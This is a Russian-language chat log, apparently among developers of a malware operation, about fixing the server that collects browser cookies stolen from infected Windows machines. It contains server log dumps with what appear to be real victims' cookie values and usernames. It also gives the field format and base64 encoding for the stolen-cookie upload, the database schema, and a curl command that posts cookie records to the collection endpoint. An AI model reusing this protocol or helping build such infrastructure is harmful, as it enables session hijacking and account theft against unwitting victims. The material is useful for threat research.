Timestamp	From	To	Message
2021-08-31 08:50:53.719659	ttrr	buza	zulas: А сейчас логирование запросов http есть, их можно проверить?
2021-08-31 08:51:29.471232	ttrr	buza	есть
2021-08-31 08:52:48.117050	ttrr	buza	Скинь тогда проблемные запросы.
2021-08-31 08:58:25.520360	ttrr	buza	2021-08-31 11:52:22.415 [info] <0.6857.3> Data: <<"POST /tot57/WIN-U4U2CDE99LP_W617601.8C95D48B33FF1976677889D52ABB8859/84/ HTTP/1.0\r\nHost: 203.76.105.227\r\nX-Real-IP: 203.76.105.227\r\nX-Forwarded-For: 203.76.105.227\r\nConnection: close\r\nContent-Length: 11059\r\nAccept: */*\r\nContent-Type: multipart/form-data; boundary=---------MOBMWAMXGTKVMATK\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\r\nCache-Control: no-cache\r\n\r\n-----------MOBMWAMXGTKVMATK\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\nAdministrador|Chrome|Lmdvb2dsZS5jb20=|Q0dJQw==|RWhReFF6RkRTRUpFWDJWelRWZzVOakZOV0RrMk1TS0hBWFJsZUhRdmFIUnRiQ3hoY0hCc2FXTmhkR2x2Ymk5NGFIUnRiQ3Q0Yld3c1lYQndiR2xqWVhScGIyNHZlRzFzTzNFOU1DNDVMR2x0WVdkbEwyRjJhV1lzYVcxaFoyVXZkMlZpY0N4cGJXRm5aUzloY0c1bkxDb3ZLanR4UFRBdU9DeGhjSEJzYVdOaGRHbHZiaTl6YVdkdVpXUXRaWGhqYUdGdVoyVTdkajFpTXp0eFBUQXVPUQ==|1625670207|1641222207|L2NvbXBsZXRlL3NlYXJjaA==\r\nAdministrador|Chrome|Lmdvb2dsZS5jb20=|Q0dJQw==|RWhReFF6RkRTRUpFWDJWelRWZzVOakZOV0RrMk1TS0hBWFJsZUhRdmFIUnRiQ3hoY0hCc2FXTmhkR2x2Ymk5NGFIUnRiQ3Q0Yld3c1lYQndiR2xqWVhScGIyNHZlRzFzTzNFOU1DNDVMR2x0WVdkbEwyRjJhV1lzYVcxaFoyVXZkMlZpY0N4cGJXRm5aUzloY0c1bkxDb3ZLanR4UFRBdU9DeGhjSEJzYVdOaGRHbHZiaTl6YVdkdVpXUXRaWGhqYUdGdVoyVTdkajFpTXp0eFBUQXVPUQ==|1625670207|1641222207|L3NlYXJjaA==\r\nAdministrador|C...">>
 State: {state,#Port<0.108426>,ranch_tcp,[cowboy_router,cowboy_handler],false,[{listener,http},{dispatch,[{'_',[],[{['...'],[],http_handler,[{limits,32768,1024,4096,102400,8529920,8388608,1024}]}]}]}],undefined,undefined,5,1,100,4096,64,4096,100,5000,1630399947415}
 ReqEmpty 0
2021-08-31 11:52:22.416 [critical] <0.6857.3>@http_handler:handle:33 Error {badmatch,false} [{base64,decode_binary,2,[{file,"base64.erl"},{line,212}]},{http_handler,'-save84/3-fun-4-',5,[{file,"src/http_handler.erl"},{line,329}]},{lists,foreach,2,[{file,"lists.erl"},{line,1338}]},{http_handler,save84,3,[{file,"src/http_handler.erl"},{line,325}]},{http_handler,handle,2,[{file,"src/http_handler.erl"},{line,30}]},{cowboy_handler,handler_handle,4,[{file,"src/cowboy_handler.erl"},{line,111}]},{cowboy_protocol,execute,4,[{file,"src/cowboy_protocol.erl"},{line,443}]}]
2021-08-31 08:58:38.141862	ttrr	buza	вот . не может басе64 декодировать
2021-08-31 08:58:42.753255	ttrr	buza	не знаю какое поле
2021-08-31 08:59:10.718399	ttrr	buza	крашей больше нет
2021-08-31 08:59:29.607972	ttrr	buza	всмысли тех что хттп2
2021-08-31 09:05:10.043063	ttrr	buza	Это старые данные. Сейчас модуль отправляет Username, Domain, Cookie_name, Cookie_value, Path  в В64
2021-08-31 09:05:45.411409	ttrr	buza	[ Group, IdLow, IdHigh, base64:decode(Username), Browser, Domain, base64:decode(Cookie_name), base64:decode(Cookie_value), Created, Expires, base64:decode(Path) ]);

вот 4 поля декодируются только
2021-08-31 09:05:49.215919	ttrr	buza	надо все ?
2021-08-31 09:07:35.427574	ttrr	buza	Нужно домен ещё декодировать
2021-08-31 09:08:11.256677	ttrr	buza	ок .. добавил в новых версиях .
2021-08-31 09:09:24.730915	ttrr	buza	<<"INSERT INTO data84 (created_at, \"group\", id_low, id_high, username, browser, \"domain\", cookie_name, cookie_value, created, expires, path ) VALUES ( now(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11 )">> [<<"tot138">>,4268354464764256071,-5531770838041019469,<<149,166,247>>,<<"Firefox">>,<<".mail.ru">>,<<"mrcu">>,<<"14B45890605336B122FB29388502">>,<<"1399543312">>,<<"1714903312">>,<<"/">>]
2021-08-31 11:52:59.108 [error] <0.6879.3>@db:transform:58 Error {error,error,<<"22021">>,<<"invalid byte sequence for encoding \"UTF8\": 0x95">>,[]} with query {<<"INSERT INTO data84 (created_at, \"group\", id_low, id_high, username, browser, \"domain\", cookie_name, cookie_value, created, expires, path ) VALUES ( now(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11 )">>,[<<"tot138">>,4268354464764256071,-5531770838041019469,<<149,166,247>>,<<"Firefox">>,<<".mail.ru">>,<<"mrcu">>,<<"14B45890605336B122FB29388502">>,<<"1399543312">>,<<"1714903312">>,<<"/">>]}

есть еще такое
2021-08-31 09:09:32.432028	ttrr	buza	на УТФ-8 не походит кодировка
2021-08-31 09:09:59.455581	ttrr	buza	И ещё нужно 2 поля добавить в конец записи.
secure, httponly
Значения: 0 & 1
2021-08-31 09:10:00.420547	ttrr	buza	насколько я понимаю это про <<149,166,247>>
2021-08-31 09:10:26.178925	ttrr	buza	в таблицу колонки ?
2021-08-31 09:10:55.308393	ttrr	buza	Да, в запись поле, в таблицу колонки.
2021-08-31 09:11:43.257386	ttrr	buza	А юникод в каком поле не проходит?
2021-08-31 09:20:09.636154	ttrr	buza	,<<149,166,247>> я думаю вот это не может быть юникодом
2021-08-31 09:20:45.226606	ttrr	buza	юзернейм
2021-08-31 09:22:08.345041	ttrr	buza	Похоже, пользователь. Скорее всего модуль не отправляет UTF8. Нужно проверить.
А ты можешь в readme этот формат добавить + описание ошибок?
Мы уже много времени потратили на поиск этих ошибок из-за отсутствия описания протокола обмена.
2021-08-31 09:23:06.135462	ttrr	buza	формат чего ?
2021-08-31 09:23:49.262733	ttrr	buza	в каталог doc есть некоторое описалово
2021-08-31 09:23:54.884501	ttrr	buza	Кукисов, например. Ещё бы хорошо остальные данные проверить.
2021-08-31 09:24:07.888534	ttrr	buza	Там кукисы описаны?
2021-08-31 09:24:16.335063	ttrr	buza	какие кукисы ?
2021-08-31 09:24:39.286025	ttrr	buza	Куки, печенюшки
2021-08-31 09:24:57.065045	ttrr	buza	я понял что такое куки, но к чему ты это говоришь ?
2021-08-31 09:25:05.873569	ttrr	buza	1. Создать новую команду для получения данных куки. Например, код команды 84

2. Создать таблицу для хранения данных (псевдокод SQL):
CREATE TABLE cookies (
  id SERIAL,
  username VARCHAR(255),
  browser VARCHAR(255)
  domain VARCHAR(255)
  cookie_name VARCHAR(255)
  cookie_value VARCHAR(255)
  created DATETIME,
  expires DATETIME,
  path VARCHAR(255)
);

3. Обеспечить прием данных в следующем формате:
- простой текст, разделенный на строки.
Разделитель строк - может быть как UNIX, так и DOS.
Одна строка - одна запись.
Разделитель полей в записи - вертикальная черта |
Формат записи:

username|browser|domain|cookie_name|cookie_value|created|expires|path\r\n

где

username     - имя пользователя
browser      - код броузера (enum = chrome|ff|ie|edge)
domain       - домен куки
cookie_name  - имя куки
cookie_value - значение куки
created      - дата-время создания, Unix time
expires      - дата-время истечения, Unix time
path         - путь URI
2021-08-31 09:26:49.566595	ttrr	buza	К тому, что у меня не было этого дока. Где описание В64? Это часть формата.
2021-08-31 09:28:37.305847	ttrr	buza	нету про базе64 .. сами добавили очевидно
2021-08-31 09:28:51.259285	ttrr	buza	чтобы экранировать символы
2021-08-31 09:29:50.579846	ttrr	buza	Ну, вот это и нужно в доку добавить.
created у нас в секундах?
2021-08-31 09:30:27.363742	ttrr	buza	created_at я ставлю сам как NOW()
2021-08-31 09:30:36.631744	ttrr	buza	Не догадываться же, как там отстойник обрабатывает, верно?
2021-08-31 09:31:00.361505	ttrr	buza	а .есть другой ..
2021-08-31 09:31:02.580980	ttrr	buza	щас посмотрю
2021-08-31 09:31:21.648550	ttrr	buza	А NOW() в секундах?
2021-08-31 09:32:35.413827	ttrr	buza	забей на NOW() это другое
2021-08-31 09:36:27.499568	ttrr	buza	CREATE TABLE public.data84 (
    id_low bigint NOT NULL,
    id_high bigint NOT NULL,
    "group" character varying(64),
    created_at timestamp without time zone,
    username text,
    browser text,
    domain text,
    cookie_name text,
    cookie_value text,
    created text,
    expires text,
    path text
);
2021-08-31 09:36:31.362123	ttrr	buza	вот таблица
2021-08-31 09:36:37.403462	ttrr	buza	created - просто текст
2021-08-31 09:36:41.644549	ttrr	buza	нету про базе64 .. сами добавили очевидно 
Ну, не для всех очевидно ) У нас каждый своей частью работы занимается, кто там что правит - зачастую неизвестно.
2021-08-31 09:36:43.346479	ttrr	buza	всё - просто текст
2021-08-31 09:37:34.039517	ttrr	buza	> У нас каждый своей частью работы занимается, кто там что правит - зачастую неизвестно.  
очевидно не я один это добавлял и не только на моей стороне, иначе не работало бы.
коду уже 5 лет
2021-08-31 09:39:30.947256	ttrr	buza	Ну, это тоже не очевидно)
По факту ошибки посыпались. Документация не полная.
2021-08-31 09:41:31.313235	ttrr	buza	где же ты был )
2021-08-31 10:40:22.320152	ttrr	buza	Zulas ты под новые поля базу тоже будешь менять?
Если да то просьба этого не делать, я веду миграции и хотелось бы чтобы все изменения в базе в них были отражены.
2021-08-31 10:40:58.852427	ttrr	buza	Я написал миграции под два поля secure и httponly
2021-08-31 10:41:19.040024	ttrr	buza	Оба логических.
2021-08-31 10:41:50.949817	ttrr	buza	не буду делать .
2021-08-31 10:41:53.240018	ttrr	buza	и в 90 команду добавились новые поля
2021-08-31 10:42:06.308337	ttrr	buza	ты базу на рабочем уже поменял ?я могу слить дамп ?
2021-08-31 10:42:24.069780	ttrr	buza	поля не будут сохраняться, если их больше?
2021-08-31 10:42:41.757952	ttrr	buza	dlls, programs, services Я тоже уже добавил
2021-08-31 10:42:55.645696	ttrr	buza	а, ок
2021-08-31 10:42:55.697776	ttrr	buza	Пока не накатил, сек сделаю
2021-08-31 10:44:25.979318	ttrr	buza	Там поле под ярлыки desktop нужно еще, но пока не добавил его в миграцию.
2021-08-31 10:44:38.108248	ttrr	buza	И в бэке его тоже вроде как нет
2021-08-31 10:44:40.986068	ttrr	buza	добавляй сразу всё чтобы мне не возвращаться
2021-08-31 10:46:16.069302	ttrr	buza	Пока не смогу. Ближе к вечеру время появится.
Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
2021-08-31 11:01:29.529553	ttrr	buza	По 2м полям в куках накатил миграции.
2021-08-31 14:33:07.584222	ttrr	buza	такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. 
В бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.
2021-08-31 14:34:45.522696	buza	ttrr	хороший вопрос, но зуласа нету в конфе уже
2021-08-31 14:34:45.526331	ttrr	buza	хороший вопрос, но зуласа нету в конфе уже
2021-08-31 14:34:50.755310	buza	ttrr	потому повтори этот вопрос как он появится
2021-08-31 14:34:50.757702	ttrr	buza	потому повтори этот вопрос как он появится
2021-08-31 14:35:16.319715	ttrr	buza	Оке, тут получается нет истории..
2021-08-31 14:35:52.752119	buza	ttrr	неа
2021-08-31 14:35:52.755543	ttrr	buza	неа
2021-09-02 11:40:03.475571	ttrr	buza	потом когда конфа будет не актуальна звездочку снимите
2021-09-02 11:40:03.476572	ttrr	buza	 > такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. 
В бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.

для начала что за запрос ? можем мы его повторить на текущей системе чтобы я его видел ?
2021-09-02 11:40:03.477426	ttrr	buza	oad
2021-09-02 11:40:03.478257	ttrr	buza	К сожалению не можем.
Если с этим серверм будет такое же история я напишу
2021-09-02 11:40:03.479115	ttrr	buza	Как повторить к сожалению не знаю пока
2021-09-02 11:40:03.479960	ttrr	buza	всем привет
2021-09-02 11:40:03.481066	ttrr	buza	как дела с деро?
2021-09-02 11:40:03.481830	ttrr	buza	zulas: понятна проблема?
2021-09-02 11:40:03.482359	ttrr	buza	деф . привет .. а в чем проблема ?
2021-09-02 11:40:03.483244	ttrr	buza	driver: отпиши что ты мне написал сюда
2021-09-02 11:40:03.484198	ttrr	buza	ответ 403 был
2021-09-02 11:40:03.484930	ttrr	buza	с ним разобрались?
2021-09-02 11:40:03.485901	ttrr	buza	Бэк отвечает 403 на попытку отправить куки.
2021-09-02 11:40:03.486747	ttrr	buza	Внесли ли изменения связанные с новыми полями?
2021-09-02 11:40:03.487800	ttrr	buza	давайте конкретно: кто и что должен внести?
2021-09-02 11:40:03.488484	ttrr	buza	тк походу зулас даже не в курсе
2021-09-02 11:40:03.489185	ttrr	buza	4ый день мы тут что то обсуждаем, а в итоге ничего не делаем
2021-09-02 11:40:03.490286	ttrr	buza	в чем проблема?
2021-09-02 11:40:03.490703	ttrr	buza	Нужно в 84 команду внести 2 поля.
secure, httponly в конец приема, получается 9 и 10 поле должно быть.
2021-09-02 11:40:03.491918	ttrr	buza	В базу должны записываться поля с такими же именами
2021-09-02 11:41:12.881216	ttrr	buza	я ничего не вносил пока ..
2021-09-02 11:41:48.444791	buza	ttrr	так уже пора внести
2021-09-02 11:41:48.448786	ttrr	buza	так уже пора внести
2021-09-02 11:41:53.191108	buza	ttrr	драйвер же просил
2021-09-02 11:41:53.195192	ttrr	buza	драйвер же просил
2021-09-02 11:42:05.651449	buza	ttrr	у нас доработка прямо сейчас в модуле сбора, требует этого
2021-09-02 11:42:05.654709	ttrr	buza	у нас доработка прямо сейчас в модуле сбора, требует этого
2021-09-02 11:42:10.209571	ttrr	buza	Ок. Когда?
2021-09-02 11:43:37.294432	ttrr	buza	Я не стал этого делать потому что мне сказали, что сейчас zulas занимается бэком, но я напрямую не писал задачу.
Возможно решил что вы с кодером модуля обсудили этот момент
2021-09-02 11:44:33.237267	ttrr	buza	(31.08.2021 13:44:35) zulas: добавляй сразу всё чтобы мне не возвращаться
(31.08.2021 13:46:11) driver: Пока не смогу. Ближе к вечеру время появится.
Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
(31.08.2021 14:01:24) driver: По 2м полям в куках накатил миграции.
2021-09-02 11:44:45.185319	ttrr	buza	ну вообще надо все сразу сделать и чтобы не возвращаться
2021-09-02 11:44:52.285203	ttrr	buza	переключение контекста -- очень тяжелая операция )
2021-09-02 11:45:14.306121	ttrr	buza	так что 
1. я жду когда в базу нужное внесется
2. когда мне будет объяснено что нужно делать
2021-09-02 11:59:16.908092	buza	ttrr	так а по-моему driver говорил что накатил миграции на базу. Это не оно?
цитату не приведу, уплыло в истории
2021-09-02 11:59:16.915112	ttrr	buza	так а по-моему driver говорил что накатил миграции на базу. Это не оно?
цитату не приведу, уплыло в истории
2021-09-02 12:03:26.089525	buza	ttrr	driver: поясни мне чего ты ждешь?
2021-09-02 12:03:26.092631	ttrr	buza	driver: поясни мне чего ты ждешь?
2021-09-02 12:03:33.358788	buza	ttrr	что нужно от зуласа?
2021-09-02 12:03:33.364153	ttrr	buza	что нужно от зуласа?
2021-09-02 12:11:37.699658	ttrr	buza	Дело в том что миграция по десктопу относится к другой задаче.
2021-09-02 12:11:51.014577	ttrr	buza	Сейчас нужно сделать 2 этих поля
2021-09-02 12:12:18.866061	buza	ttrr	zulas: сделаешь?
2021-09-02 12:12:18.869679	ttrr	buza	zulas: сделаешь?
2021-09-02 12:14:06.096417	ttrr	buza	Более того к другой команде и к другой таблице.
2021-09-02 12:15:43.896786	ttrr	buza	@driver давай конкретно что тебе надо и куда ... ок ?
2021-09-02 12:17:36.622635	ttrr	buza	Нужно в 84 команду внести 2 поля.
secure, httponly в конец приема, получается 9 и 10 поле должно быть.
2021-09-02 12:18:22.061675	ttrr	buza	На запрос вида 
curl -X POST -F 'data=dXNlcg==|IE||||1240428288|1240428288|dXNlcg==|IE|demdex.net|ZGVtZGV4|NTczODQzMjMyMTAwNDg1MDEyMDI3NjIxMTIxODA0ODI1OTMyMjQ=|1240428358|1240428358|Lw==|1|1' http://(IP)/TAG/TEST_W639600.1234A242341C6D1A25B3F315D688968E/84/
Должно ответить /1/
2021-09-02 12:20:09.145575	ttrr	buza	ок .. сейчас в базе поля уже есть ?
2021-09-02 12:20:19.949749	ttrr	buza	Да
2021-09-02 12:28:19.570896	ttrr	buza	а старые клиенты еще работают ?
2021-09-02 12:28:40.296832	ttrr	buza	т.е. надо поддерживать и старый формат и новый ?
2021-09-02 12:29:44.532344	ttrr	buza	Нет, просто только новый должен начать работать.
2021-09-02 12:30:37.242447	ttrr	buza	Уже внесли нужные изменения для клиентов. Ждем именно чтобы подхватило эти изменения часть по бэку
2021-09-02 12:59:04.944086	ttrr	buza	zulas: очень прошу поторопиться, так как сейчас от тебя зависит работа многих, без правок бекенда не можем дальше двинуться
2021-09-02 13:03:56.540055	ttrr	buza	хорошо сделаю
2021-09-02 13:23:09.878163	ttrr	buza	[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path, Secure, HttpOnly ]
2021-09-02 13:23:13.462035	ttrr	buza	такая последовательность ?
2021-09-02 13:23:20.883767	ttrr	buza	@driver
2021-09-02 13:26:58.912089	ttrr	buza	@defender как мне запушить изменения ?
2021-09-02 13:37:09.262183	ttrr	buza	Да все верно.
2021-09-02 14:18:44.636605	ttrr	buza	zulas: а я тебе вроде выдавал доступ, разве нет?
2021-09-06 10:10:21.977774	ttrr	buza	сегодня отдых у всех ?
2021-09-13 12:50:12.637875	ttrr	buza	сегодня отдых у всех ?
2021-09-13 12:50:18.677351	buza	ttrr	есть кто
2021-09-13 12:50:18.678550	ttrr	buza	есть кто
2021-09-14 10:06:28.575970	ttrr	buza	сегодня отдых у всех ?
2021-09-14 10:06:28.576902	ttrr	buza	есть кто
